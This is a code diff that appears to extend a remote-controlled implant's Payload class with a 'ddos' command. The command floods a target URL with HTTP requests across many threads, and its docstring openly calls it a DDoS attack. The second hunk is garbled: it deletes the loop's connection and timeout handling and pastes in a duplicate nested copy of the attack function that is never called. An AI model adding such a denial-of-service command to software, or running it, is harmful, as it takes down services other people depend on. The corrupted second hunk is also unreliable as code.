@@ -971,6 +971,52 @@ class Payload():
 
         print("Done in", time.time() - start, "seconds")    
         return "Completed {} requests to {}".format(total_requests, url)
+    
+    @config(platforms=['win32','linux','linux2','darwin'], command=True, usage='ddos <url> <num_threads> <total_requests>')
+    def ddos(self, args):
+        """
+        Perform HTTP-based DDoS attack on a target URL
+        
+        :param str args: "url num_threads total_requests"
+        """
+        try:
+            args = str(args).split()
+            if len(args) < 3:
+                return "Usage: {}".format(self.ddos.usage)
+            
+            url = args[0]
+            num_threads = int(args[1])
+            total_requests = int(args[2])
+            
+            if num_threads < 1 or total_requests < 1:
+                return "Error: num_threads and total_requests must be positive integers"
+            
+            if not url.startswith('http://') and not url.startswith('https://'):
+                url = 'http://' + url
+            
+            start = time.time()
+            request_count = 0
+            
+            def task(_):
+                return self.send_http_request(url)
+            
+            with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
+                futures = [executor.submit(task, i) for i in range(total_requests)]
+                
+                for future in concurrent.futures.as_completed(futures):
+                    try:
+                        response = future.result()
+                        request_count += 1
+                    except Exception as e:
+                        log("Request failed: {}".format(str(e)))
+            
+            elapsed = time.time() - start
+            return "Completed {} requests to {} in {:.2f} seconds".format(total_requests, url, elapsed)
+        except (ValueError, IndexError) as e:
+            return "Error: {}. Usage: {}".format(str(e), self.ddos.usage)
+        except Exception as e:
+            return "DDoS error: {}".format(str(e))
+    
     def send_task(self, task):
         """
         Send task results to the server
@@ -1115,10 +1161,39 @@ class Payload():
                         task.update({'result': result})
                         self.send_task(task)
 
-                    if not self.gui:
-                        self.flags.prompt.set()
-                elif self.flags.prompt.set() and not self.flags.connection.wait(timeout=1.0):
-                    self.kill()
-            else:
-                log("Connection timed out")
-                break
+                    def ddos(self, args):
+                        try:
+                            args = str(args).split()
+                            if len(args) < 3:
+                                return "Usage: {}".format(self.ddos.usage)
+                            url = args[0]
+                            num_threads = int(args[1])
+                            total_requests = int(args[2])
+                            if num_threads < 1 or total_requests < 1:
+                                return "Error: num_threads and total_requests must be positive integers"
+                            if not url.startswith('http://') and not url.startswith('https://'):
+                                url = 'http://' + url
+            
+                            start = time.time()
+                            request_count = 0
+
+                            def task(_):
+                                return self.send_http_request(url)
+
+                            with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
+                                futures = [executor.submit(task, i) for i in range(total_requests)]
+
+                                for future in concurrent.futures.as_completed(futures):
+                                    try:
+                                        response = future.result()
+                                        request_count += 1
+                                        print(f"Status code: {response.status_code} - Response length: {len(response.text)} - Count: {request_count}")
+                                    except Exception as e:
+                                        print("Request failed:", e)
+
+                            elapsed = time.time() - start
+                            return "Completed {} requests to {} in {:.2f} seconds".format(total_requests, url, elapsed)
+                        except (ValueError, IndexError) as e:
+                            return "Error: {}. Usage: {}".format(str(e), self.ddos.usage)
+                        except Exception as e:
+                            return "DDoS error: {}".format(str(e))
